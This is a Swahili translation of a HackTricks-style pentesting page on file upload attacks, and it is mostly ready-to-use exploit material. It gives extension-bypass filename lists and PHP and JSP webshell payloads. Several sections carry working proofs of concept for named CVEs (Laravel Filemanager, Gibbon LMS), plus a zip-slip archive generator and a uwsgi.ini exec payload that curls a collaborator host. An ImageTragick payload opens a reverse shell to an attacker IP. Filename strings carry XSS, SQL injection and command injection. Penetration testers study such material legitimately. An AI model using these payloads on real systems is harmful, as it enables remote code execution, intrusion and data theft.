# Upakiaji Faili

{{#include ../../banners/hacktricks-training.md}}

## Mbinu Za Jumla za Upakiaji Faili

Viambatanisho vingine muhimu:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Kufanya kazi katika PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Kupita ukaguzi wa viambatanisho vya faili

1. Ikiwa zinatumika, angalia viambatanisho vilivyotajwa hapo juu. Pia jaribu kwa kutumia baadhi ya herufi kubwa: _pHp, .pHP5, .PhAr ..._
2. _Angalia **kuongeza extension halali kabla ya** extension ya utekelezaji (tumia pia viambatanisho vilivyotajwa):_
- _file.png.php_
- _file.png.Php5_
3. Jaribu kuongeza **herufi maalum mwishoni.** Unaweza kutumia Burp kufanya **bruteforce** kwa herufi zote za **ascii** na **Unicode**. (_Kumbuka unaweza pia kujaribu kutumia **viambatanisho** vilivyotajwa hapo awali_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Jaribu kupita ulinzi kwa **kudanganya parser ya extensions** upande wa server kwa mbinu kama **kuzidisha** **extension** au **kuongeza takataka** (baiti **null**) kati ya viambatanisho. _Unaweza pia kutumia **viambatanisho** vilivyotajwa hapo awali kutengeneza payload bora._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ongeza **safu nyingine ya viambatanisho** kwenye jaribio la hapo juu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Jaribu kuweka **exec extension kabla ya extension halali** na kutegemea server kuwa imesanidiwa vibaya. (inayofaa kutumia Apache misconfigurations ambapo kitu chochote chenye extension** _**.php**_**, lakini sio lazima kinachomalizika kwa .php** kitaweza kuendesha code):
- _ex: file.php.png_
7. Kutumia **NTFS alternate data stream (ADS)** katika **Windows**. Katika kesi hii, herufi ya colon ":" itaingizwa baada ya extension iliyofungiwa na kabla ya ile inayoruhusiwa. Matokeo yake, **faili tupu yenye extension iliyofungiwa** itaundwa kwenye server (kwa mfano "file.asax:.jpg”). Faili hii inaweza kuhaririwa baadaye kwa kutumia mbinu nyingine kama kutumia jina lake fupi la faili. Muundo "**::$data**” pia unaweza kutumiwa kuunda faili zisizo tupu. Kwa hivyo, kuongeza nukta baada ya muundo huu pia inaweza kusaidia kupita vikwazo zaidi (mf. "file.asp::$data.”)
8. Jaribu kuvunja mipaka ya jina la faili. Extension halali itakatwa. Na PHP baya itabaki. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Baadhi ya upload handlers hukanusha au kuanzisha upya nukta zinazofuata mwishoni kwenye jina lililohifadhiwa la faili. Katika UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) matoleo kabla ya 2.9.1, unaweza kupita ukaguzi wa extension kwa:

- Kutumia MIME ya picha halali na magic header (kwa mfano, PNG’s `\x89PNG\r\n\x1a\n`).
- Kuitia jina faili iliyopakiwa na extension ya PHP ikifuatiwa na nukta, mfano `shell.php.`.
- Server inakata nukta ya mwishoni na kuendelea kuhifadhi `shell.php`, ambayo itaendeshwa ikiwa itawekwa katika directory inayohudumia wavuti (default public storage kama `/storage/files/`).

PoC ndogo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Kisha fikia path iliyohifadhiwa (kawaida katika Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Marekebisho:
- Sasisha unisharp/laravel-filemanager hadi ≥ 2.9.1.
- Wekeza allowlists kali upande wa server na thibitisha tena jina la faili lililohifadhiwa.
- Tumikia uploads kutoka maeneo yasiyoweza kutekelezwa.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Tafuta udhaifu unaoweza **kurejina** faili iliyopakuliwa tayari (kubadilisha extension).
- Tafuta Local File Inclusion vulnerability ili kutekeleza backdoor.
- KIFO ya taarifa inayowezekana:
1. Paka kwa ku-upload **marudio kadhaa** (na kwa **muda huo huo**) **faili ile ile** yenye **jina lile lile**
2. Upload faili yenye **jina** la **faili** au **folda** ambayo **tayari ipo**
3. Upload faili yenye jina **"." , "..", or "…"**. Kwa mfano, kwenye Apache katika **Windows**, ikiwa application inaokoa uploaded files kwenye directory "/www/uploads/", filename "." itaunda faili inayoitwa uploads” katika directory "/www/".
4. Upload faili ambayo haiwezi kufutwa kwa urahisi kama **"…:.jpg"** katika **NTFS**. (Windows)
5. Upload faili katika **Windows** yenye **characters batili** kama `|<>*?”` katika jina lake. (Windows)
6. Upload faili katika **Windows** ukitumia majina yaliyohifadhiwa (**reserved**/**forbidden**) kama CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Pia jaribu ku-upload **executable** (.exe) au **.html** (inayoshukuwa kidogo) ambayo **itaendesha code** wakati itafunguliwa bila kutarajiwa na mwathiriwa.

### Special extension tricks

Ikiwa unajaribu ku-upload files kwenye **PHP server**, [angalia trick ya **.htaccess** ili kutekeleza code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ikiwa unajaribu ku-upload files kwenye **ASP server**, [angalia trick ya **.config** ili kutekeleza code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Faili za `.phar` ni kama `.jar` kwa java, lakini kwa php, na zinaweza **kutumika kama php file** (kuziendesha kwa php, au kuzijumuisha ndani ya script...)

Extension `.inc` wakati mwingine hutumiwa kwa php files ambazo hutumiwa tu ku **import files**, hivyo, kwa wakati fulani, mtu anaweza kuwa amemuacha mtu kuruhusiwa **kuendesha extension hii**.

## **Jetty RCE**

Ikiwa unaweza ku-upload faili ya XML kwenye Jetty server unaweza kupata [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Kwa hivyo, kama ilivyoelezwa kwenye picha ifuatayo, upload faili ya XML hadi `$JETTY_BASE/webapps/` na matarajie shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Kwa uchambuzi wa kina wa udhaifu huu angalia utafiti asili: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities zinaweza kutumika kwenye uWSGI servers ikiwa mtu ana uwezo wa kubadilisha `.ini` configuration file. uWSGI configuration files zinatumia sintaksia maalum kuingiza "magic" variables, placeholders, na operators. Haswa, operator '@', inayotumika kama `@(filename)`, imetengenezwa kuingiza yaliyomo ya file. Miongoni mwa schemes mbalimbali zinazoungiwa mkono katika uWSGI, scheme ya "exec" ni hatari hasa, ikiruhusu kusoma data kutoka standard output ya process. Kipengele hiki kinaweza kutumiwa kwa madhumuni mabaya kama Remote Command Execution au Arbitrary File Write/Read wakati `.ini` configuration file inapotumika.

Angalia mfano ufuatao wa `uwsgi.ini` yenye madhara, ikionyesha schemes mbalimbali:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Utekelezaji wa payload hufanyika wakati wa parsing ya configuration file. Ili configuration ianze kutumika na kuparsing, mchakato wa uWSGI lazima uanzishwe upya (enaweza baada ya crash au kutokana na Denial of Service attack) au faili lazima iwe imewekwa kwenye auto-reload. Kipengele cha auto-reload, ikiwa kimewezeshwa, kinarudisha faili kwa vipindi vilivyowekwa wakati kinapotambua mabadiliko.

Ni muhimu kuelewa asili isiyokali ya parsing ya configuration file ya uWSGI. Hasa, payload iliyozungumziwa inaweza kuingizwa ndani ya binary file (kama image au PDF), ikipanua zaidi wigo wa matumizi mabaya.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint katika Gibbon LMS inaruhusu arbitrary file write ndani ya web root, ikisababisha pre-auth RCE kwa kuangusha faili ya PHP. Vulnerable versions: hadi na ikiwa ni pamoja na 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server haizingatii type/name, base64-decodes sehemu ya mwisho)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: thamani yoyote isiyo tupu inakubaliwa (e.g., `0000000001`)

Minimal PoC ya kuandika na kusoma faili:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Weka webshell ndogo na tekeleza amri:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- Handler hufanya `base64_decode($_POST["img"])` baada ya kugawanya kwa `;` na `,`, kisha huandika bytes kwenye `$absolutePath . '/' . $_POST['path']` bila kuthibitisha extension/type.
- Msimbo unaotokea unaendesha kama mtumiaji wa huduma ya wavuti (kwa mfano, XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

Katika baadhi ya nyakati unaweza kugundua kwamba server inatumia **`wget`** kupakua faili na unaweza kuonyesha **URL**. Katika kesi hizi, msimbo unaweza kuwa unacheki kwamba extension ya faili zilizopakuliwa iko ndani ya whitelist ili kuhakikisha kwamba faili tu zinazoruhusiwa ndizo zitakapopakuliwa. However, **this check can be bypassed.**\
Urefu wa juu kabisa wa jina la faili katika **linux** ni **255**, hata hivyo, **wget** hupunguza majina ya faili hadi **236** characters. Unaweza **download a file called "A"*232+".php"+".gif"**, jina hili la faili lita**bypass** the **check** (kama katika mfano huu **".gif"** ni extension halali) lakini `wget` itabadilisha jina la faili kuwa **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Kumbuka kwamba **chaguo jingine** unaloweza kufikiria kutumia kuzipita kwa ukaguzi huu ni kufanya **HTTP server redirect kwa faili tofauti**, hivyo URL ya awali itapita ukaguzi lakini wget itapakua faili iliyorejelezwa kwa jina jipya. Hii **haitafanya kazi** **isipokuwa** wget inatumika na **kigezo** `--trust-server-names` kwa sababu **wget itapakua ukurasa uliorejelezwa kwa jina la faili lililoonyeshwa katika URL ya awali**.

### Kuondoka kwenye upload directory kwa kutumia NTFS junctions (Windows)

(Kwa shambulio hili utahitaji access ya ndani kwa mashine ya Windows) Wakati uploads zinahifadhiwa chini ya subfolders za kila mtumiaji kwenye Windows (mfano, C:\Windows\Tasks\Uploads\<id>\) na wewe unadhibiti uundaji/ufutaji wa subfolder hiyo, unaweza kuibadilisha na directory junction inayowelekeza kwenye eneo nyeti (mfano, webroot). Uploads zinazofuata zitaandikwa kwenye njia lengwa, kuruhusu utekelezaji wa code ikiwa eneo lengwa linafasiri server‑side code.

Mfano wa mtiririko wa kuelekeza uploads ndani ya XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Vidokezo
- mklink /J creates an NTFS directory junction (reparse point). Akaunti ya web server lazima ifuate junction na kuwa na ruhusa ya kuandika kwenye mahali lengwa.
- Hii inaelekeza arbitrary file writes; kama mahali lengwa inaendesha scripts (PHP/ASP), hii inakuwa RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Baadhi ya upload/ingest handlers huandika raw request body kwenye filesystem path inayojengwa kutoka kwa user-controlled query parameters. Ikiwa handler pia inaunga mkono Content-Encoding: gzip na inashindwa canonicalize/validate the destination path, unaweza kuchanganya directory traversal na gzipped payload kuandika arbitrary bytes katika web-served directory na kupata RCE (kwa mfano, drop a JSP under Tomcat’s webapps).

Generic exploitation flow:
- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
- Browse to the written file to trigger execution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Kisha chochea:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Maelezo
- Njia za lengo zinatofautiana kulingana na usanikishaji (mfano, /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ katika baadhi ya stacks). Any web-exposed folder that executes JSP itafanya kazi.
- Burp Suite’s Hackvertor extension inaweza kuzalisha gzip body sahihi kutoka kwa payload yako.
- Hii ni pattern safi ya pre-auth arbitrary file write → RCE; haitegemei multipart parsing.

Mikakati ya kuzuia
- Tambua mahali pa upload upande wa server; usiwatii path fragments zinazotoka kwa clients.
- Fanya canonicalize na hakikisha kuwa njia iliyotatuliwa inabaki ndani ya saraka ya msingi iliyoorodheshwa (allow-listed).
- Hifadhi uploads kwenye volume isiyo-executable na kataza utekelezaji wa script kutoka kwa paths zinazoweza kuandikwa.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ni zana yenye nguvu iliyoundwa kusaidia Pentesters na Bug Hunters katika kujaribu mechanisms za file upload. Inatumia mbinu mbalimbali za bug bounty kurahisisha mchakato wa kutambua na kuchunguza udhaifu, kuhakikisha tathmini za kina za web applications.

### Corrupting upload indices with snprintf quirks (historical)

Baadhi ya legacy upload handlers zinazotumia `snprintf()` au zinazofanana kujenga multi-file arrays kutoka kwa single-file upload zinaweza kudanganywa ili kuunda upya muundo wa `_FILES`. Kutokana na ukosefu wa muafaka na kukata kwa tabia ya `snprintf()`, upload moja iliyojaa kwa ustadi inaweza kuonekana kama faili nyingi zenye index upande wa server, ikachanganya logic inayodhani muundo thabiti (mfano, kuichukulia kama multi-file upload na kuchukua matawi ambayo si salama). Ingawa ni ndogo leo, pattern hii ya "index corruption" mara kwa mara hujitokeza tena katika CTFs na codebases za zamani.

## From File upload to other vulnerabilities

- Weka **filename** kuwa `../../../tmp/lol.png` na jaribu kufikia **path traversal**
- Weka **filename** kuwa `sleep(10)-- -.jpg` na huenda ukaweza kufikia **SQL injection**
- Weka **filename** kuwa `<svg onload=alert(document.domain)>` ili kufikia **XSS**
- Weka **filename** kuwa `; sleep 10;` kujaribu baadhi ya command injection (angalia zaidi ya [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Jaribu **different svg payloads** kutoka [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ikiwa unaweza **kumtaja web server achukue image kutoka kwa URL** unaweza kujaribu kuabusu [SSRF](../ssrf-server-side-request-forgery/index.html). Ikiwa **image** hii itahifadhiwa kwenye site ya **umum**, unaweza pia kumtaja URL kutoka [https://iplogger.org/invisible/](https://iplogger.org/invisible/) na **kuiba taarifa za kila mtembelea**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDFs zilizotengenezwa mahsusi kwa XSS: Ukurasa uliofuata unaelezea jinsi ya **kujaza data ya PDF kupata utekelezaji wa JS** (../xss-cross-site-scripting/pdf-injection.md). Ikiwa unaweza ku-upload PDFs unaweza kuandaa PDF itakayoendesha JS yoyote kwa kufuata maelekezo yaliyotolewa.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content ili kuangalia kama server ina **antivirus**
- Angalia kama kuna **size limit** unapopakua files

Hapa kuna orodha ya juu 10 ya mambo unayoweza kuyafanikisha kwa kupakia (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes za kichwa (Magic Header Bytes)

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Rejelea [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) kwa filetypes nyingine.

## Zip/Tar File Automatically decompressed Upload

Ikiwa unaweza kupakia ZIP ambayo itafunguliwa (decompressed) ndani ya server, unaweza kufanya mambo 2:

### Symlink

Pakia link yenye soft links kwa faili nyingine, kisha, kwa kufikia faili zilizofunguliwa utapata faili zilizoangaziwa:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Kutoa kwenye folda tofauti

Uundaji usiotarajiwa wa faili ndani ya saraka wakati wa kuondoa archive ni tatizo kubwa. Ingawa ilidhaniwa awali mpangilio huu ungezuia utekelezaji wa amri za OS kupitia uploads zenye madhara, msaada wa ZIP kwa compression ya kihierarki na uwezo wa directory traversal unaweza kutumiwa. Hii inawawezesha wadukuzi kupita vikwazo na kutoroka kutoka kwenye saraka za upload zilizo salama kwa kubadilisha utendaji wa decompression wa programu lengwa.

Exploit otomatiki ya kutengeneza faili kama hizi inapatikana kwenye [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Zana hii inaweza kutumika kama inavyoonyeshwa:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zaidi ya hayo, **symlink trick with evilarc** pia ni chaguo. Ikiwa lengo ni kulenga faili kama `/flag.txt`, symlink kwa faili hiyo inapaswa kuundwa kwenye mfumo wako. Hii inahakikisha kuwa evilarc haitapata makosa wakati wa utekelezaji wake.

Hapo chini kuna mfano wa msimbo wa Python unaotumika kutengeneza faili ya zip yenye madhumuni mabaya:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Matumizi mabaya ya ukandishaji kwa file spraying**

Kwa maelezo zaidi **angalia chapisho la asili katika**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Kuunda PHP Shell**: Msimbo wa PHP umeandikwa kutekeleza amri zinazopitishwa kupitia variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying na Uundaji wa Faili Zilizofinywa**: Faili nyingi zinaundwa na archive ya zip inaundwa ikijumuisha faili hizi.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Marekebisho kwa kutumia Hex Editor au vi**: Majina ya faili ndani ya zip yanabadilishwa kwa kutumia vi au hex editor, kubadilisha "xxA" kuwa "../" ili kupita kwenye directories.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Pakia yaliyomo haya ukiwa na extension ya picha ili kutumia udhaifu **(ImageMagick , 7.0.1-1)** (kutoka kwenye [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Kuingiza PHP Shell kwenye PNG

Kuingiza PHP shell kwenye IDAT chunk ya faili ya PNG kunaweza kupitisha kwa ufanisi baadhi ya shughuli za image processing. Functions `imagecopyresized` na `imagecopyresampled` kutoka PHP-GD zina umuhimu maalum katika muktadha huu, kwani mara nyingi zinatumika kwa resizing na resampling ya images, mtawalia. Uwezo wa PHP shell iliyowekwa kubaki bila kuathiriwa na shughuli hizi ni faida kubwa kwa matumizi fulani.

Uchambuzi wa kina wa teknik hii, ikiwa ni pamoja na methodology na matumizi yake yanayowezekana, umewekwa katika makala ifuatayo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Rasilimali hii inatoa uelewa mpana wa mchakato na athari zake.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

